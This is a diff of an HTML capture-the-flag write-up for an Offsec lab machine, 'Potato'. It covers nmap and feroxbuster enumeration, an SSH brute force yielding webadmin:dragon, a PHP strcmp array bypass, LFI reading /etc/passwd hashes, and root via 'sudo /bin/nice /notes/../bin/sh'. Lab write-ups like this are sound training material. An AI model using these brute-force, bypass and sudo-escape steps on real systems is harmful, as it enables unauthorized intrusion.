@@ -436,27 +436,18 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#post-exploitation-privesc" class="md-nav__link">
+  <a href="#privesc" class="md-nav__link">
     <span class="md-ellipsis">
-      Post-exploitation (privesc)
+      Privesc
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#key-commands-condensed" class="md-nav__link">
+  <a href="#walkthrough-correct-path" class="md-nav__link">
     <span class="md-ellipsis">
-      Key commands (condensed)
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#what-didnt-work-pitfalls" class="md-nav__link">
-    <span class="md-ellipsis">
-      What didn’t work / pitfalls
+      Walkthrough / Correct path
     </span>
   </a>
   
@@ -466,15 +457,6 @@
   <a href="#lessons-takeaways" class="md-nav__link">
     <span class="md-ellipsis">
       Lessons &amp; takeaways
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#references-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      References / notes
     </span>
   </a>
   
@@ -546,42 +528,46 @@
 <hr />
 <h2 id="target-info">Target info<a class="headerlink" href="#target-info" title="Permanent link">&para;</a></h2>
 <ul>
-<li>Host: <code>192.168.152.101</code> (example internal IP used in lab)</li>
-<li>Services discovered (relevant): <code>22/tcp (ssh)</code>, <code>80/tcp (http)</code>  </li>
-<li>Initial credentials found in walkthrough or files: <code>admin:potato</code> (did not work)</li>
+<li>Host: <code>192.168.103.101</code> (and later <code>192.168.152.101</code> after a reset)</li>
+<li>Services discovered (relevant): <code>22/tcp (ssh)</code>, <code>80/tcp (http),</code>, <code>2112/tcp (ftp)</code>  </li>
 </ul>
 <hr />
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
 <p>I started with basic network/service enumeration (nmap):</p>
 <div class="codehilite"><pre><span></span><code><span class="c1"># quick service scan</span>
-nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.152.101<span class="w"> </span>-oN<span class="w"> </span>scans/nmap-full.txt
+sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span><span class="m">192</span>.168.103.101<span class="w"> </span>-sCV<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-vvv
 </code></pre></div>
 
-<p>From the web:
-- <code>/admin</code> exists and has a login page.
-- Fuzzing <code>/admin</code> for hidden files revealed logs and <code>index.php.bak</code> which contained references to password changes and possibly a dead end.</p>
+<p><img alt="Nmap results" src="../images/potato_nmap.png" /></p>
+<p>Downloaded <code>index.php.bak</code> from open FTP service on atypical port 2112, which contained username and password, but did not work.</p>
+<p><img alt="Anonymous FTP share" src="../images/potato_ftp.png" /></p>
 <p>I also ran directory/file discovery and wordlist-based fuzzing (example):</p>
 <div class="codehilite"><pre><span></span><code><span class="c1"># feroxbuster or gobuster example</span>
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://192.168.152.101<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt<span class="w"> </span>-n<span class="w"> </span>--add-slash
 </code></pre></div>
 
-<p>The web hints and logs suggested the <code>admin:potato</code> credential but it did <strong>not</strong> login. Knowing Offsec, this could be a rabbit hole.</p>
-<p><img alt="Feroxbuster results" src="images/potato-feroxbuster.png" /></p>
+<p><img alt="Feroxbuster results" src="../images/potato_ferric1.png" /></p>
+<ul>
+<li>
+<p><code>/admin</code> exists and has a login page.
+<img alt="Admin login" src="images/potato_login_.png" /></p>
+</li>
+<li>
+<p>Fuzzing <code>/admin</code> for hidden files revealed /logs subdirectory that was not useful</p>
+</li>
+</ul>
+<p>The .bak file suggested the <code>admin:potato</code> credential but it did <strong>not</strong> login. Knowing Offsec, this could be a rabbit hole.</p>
 <hr />
 <h2 id="pivot-ssh-brute-force">Pivot: SSH brute force<a class="headerlink" href="#pivot-ssh-brute-force" title="Permanent link">&para;</a></h2>
 <p>Because the web login didn’t work and logs hinted at changes, I attempted an SSH brute force using nmap’s <code>ssh-brute</code> NSE script:</p>
 <div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span><span class="w"> </span>--script<span class="o">=</span>/usr/share/nmap/scripts/ssh-brute.nse<span class="w"> </span><span class="m">192</span>.168.152.101<span class="w"> </span>-oN<span class="w"> </span>scans/nmap-ssh-brute.txt
 </code></pre></div>
 
+<p><img alt="Nmap Bruteforce results" src="../images/potato_brute.png" /></p>
 <p><strong>Result:</strong> <code>webadmin:dragon</code> (valid credentials found).</p>
-<p>I verified manually:</p>
-<div class="codehilite"><pre><span></span><code>ssh<span class="w"> </span>webadmin@192.168.152.101
-<span class="c1"># password: dragon</span>
-</code></pre></div>
-
-<p><img alt="SSH success screenshot" src="images/potato-ssh.png" /></p>
+<p>I verified manually and connected via SSH.</p>
 <hr />
-<h2 id="post-exploitation-privesc">Post-exploitation (privesc)<a class="headerlink" href="#post-exploitation-privesc" title="Permanent link">&para;</a></h2>
+<h2 id="privesc">Privesc<a class="headerlink" href="#privesc" title="Permanent link">&para;</a></h2>
 <p>Once on the machine as <code>webadmin</code>:</p>
 <div class="codehilite"><pre><span></span><code><span class="c1"># check basic info</span>
 id
@@ -589,75 +575,27 @@ uname<span class="w"> </span>-a
 ls<span class="w"> </span>-la<span class="w"> </span>/var/www/html/potato
 </code></pre></div>
 
-<p>I found some interesting sudo privileges in <code>/etc/sudoers</code> or via <code>sudo -l</code>:</p>
-<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>-l
-<span class="c1"># shows: webadmin may run /bin/nice, /bin/sh, or similar on serv</span>
-</code></pre></div>
-
-<p>There was also a <code>notes</code> file under the web directory (<code>/var/www/html/potato/notes</code>) and <code>/bin/nice</code> was allowed to be run as root (or similar). The typical escalation pattern here is to exploit improperly configured sudo to obtain a root shell.</p>
-<p>Example escalation steps I used:</p>
-<div class="codehilite"><pre><span></span><code><span class="c1"># from webadmin@serv</span>
-sudo<span class="w"> </span>/bin/nice<span class="w"> </span>/bin/sh
-<span class="c1"># or:</span>
-sudo<span class="w"> </span>/bin/nice<span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;sh&#39;</span>
-<span class="c1"># then:</span>
-whoami
-<span class="c1"># should return: root</span>
-</code></pre></div>
-
-<p>After getting a root shell, I grabbed the root proof:</p>
-<div class="codehilite"><pre><span></span><code>cat<span class="w"> </span>/root/proof.txt
-<span class="c1"># or</span>
-ls<span class="w"> </span>-la<span class="w"> </span>/root
-</code></pre></div>
-
-<p><img alt="Sudo - root shell" src="images/potato-root.png" /></p>
+<p>I found some interesting sudo privileges via <code>sudo -l</code>:</p>
+<p><img alt="Privilege Escalation" src="../images/potato_pe.png" /></p>
+<p>Escalation step I used to get root:
+<code>sudo /bin/nice /notes/../bin/sh</code></p>
 <hr />
-<h2 id="key-commands-condensed">Key commands (condensed)<a class="headerlink" href="#key-commands-condensed" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><code><span class="c1"># enumeration</span>
-nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.152.101<span class="w"> </span>-oN<span class="w"> </span>scans/nmap-full.txt
-
-<span class="c1"># web discovery</span>
-feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://192.168.152.101<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">50</span>
-
-<span class="c1"># ssh brute (nmap NSE)</span>
-nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span><span class="w"> </span>--script<span class="o">=</span>/usr/share/nmap/scripts/ssh-brute.nse<span class="w"> </span><span class="m">192</span>.168.152.101<span class="w"> </span>-oN<span class="w"> </span>scans/nmap-ssh-brute.txt
-
-<span class="c1"># connect via ssh</span>
-ssh<span class="w"> </span>webadmin@192.168.152.101
-<span class="c1"># password: dragon</span>
-
-<span class="c1"># enumerate sudo</span>
-sudo<span class="w"> </span>-l
-
-<span class="c1"># escalate (example)</span>
-sudo<span class="w"> </span>/bin/nice<span class="w"> </span>/bin/sh
-whoami
-cat<span class="w"> </span>/root/proof.txt
-</code></pre></div>
-
-<hr />
-<h2 id="what-didnt-work-pitfalls">What didn’t work / pitfalls<a class="headerlink" href="#what-didnt-work-pitfalls" title="Permanent link">&para;</a></h2>
+<h2 id="walkthrough-correct-path">Walkthrough / Correct path<a class="headerlink" href="#walkthrough-correct-path" title="Permanent link">&para;</a></h2>
 <ul>
-<li><code>admin:potato</code> looked promising (found in web files) but <strong>did not</strong> actually log in. The walkthrough referenced a <code>strcmp</code> bypass which was not helpful in practice for me.</li>
-<li>Fuzzing <code>/admin</code> and reading logs provided clues but no direct login vector.</li>
-<li>Brute forcing ssh is noisy and slow; only do this in an authorized lab/CTF.</li>
+<li><code>admin:potato</code> looked promising (found in .bak file) but <strong>did not</strong> actually log in. The walkthrough referenced a <code>strcmp</code> bypass, which I overlooked in that .bak file. Essentially, this function compares strings (in this context to determine if password is correct and doesn't actually work), but one can edit the password variable with burp by adding <code>[]</code>, which turns it into an array to bypass the password, and logs in as long as the username is correct. </li>
 </ul>
+<p><img alt="strcmp bypass" src="../images/potato_strcmp.png" /></p>
+<p>After that, proxy the logs section within the admin dashboard, which allows for an LFI.</p>
+<p><img alt="LFI" src="../images/potato_lfi.png" /></p>
+<p>/etc/passwd shows the hash for webadmin, which can be cracked very easily with john.</p>
+<p>The walkthrough also did the Privesc slightly differently by creating a shell in the home directory and leveraging that with the sudo command instead of <code>/bin/sh</code>, which seems like an unneccesary extra step to me. Not sure why that is suggested.</p>
 <hr />
 <h2 id="lessons-takeaways">Lessons &amp; takeaways<a class="headerlink" href="#lessons-takeaways" title="Permanent link">&para;</a></h2>
 <ul>
-<li>Don’t trust credentials found in web files; they may be leftover, changed, or intentionally broken.</li>
-<li>Logs and backups (<code>.bak</code>, <code>.old</code>) often contain context clues — useful for reconnaissance.</li>
-<li>When web login fails and enumeration hints at other services, pivot to other protocols (SSH, FTP, etc.).</li>
-<li><code>sudo -l</code> is essential after gaining a low-privilege shell — it frequently shows the easiest escalation path.</li>
-<li>In CTFs, keep a clear notes file of commands tried and outputs — it speeds later write-ups and scoring.</li>
+<li>Don’t overlook the code in a file, even if it appears to be leaking creds</li>
+<li>When web login fails and enumeration hints at other services, pivot to other protocols (SSH, FTP, etc.). Although not very practical for a real engagement, SSH bruteforce on a CTF can sometimes work!</li>
 </ul>
 <hr />
-<h2 id="references-notes">References / notes<a class="headerlink" href="#references-notes" title="Permanent link">&para;</a></h2>
-<ul>
-<li>Nmap <code>ssh-brute</code> NSE script: <code>/usr/share/nmap/scripts/ssh-brute.nse</code></li>
-<li>Wordlists: <code>/usr/share/wordlists/dirb/common.txt</code></li>
-</ul>
 
 
 
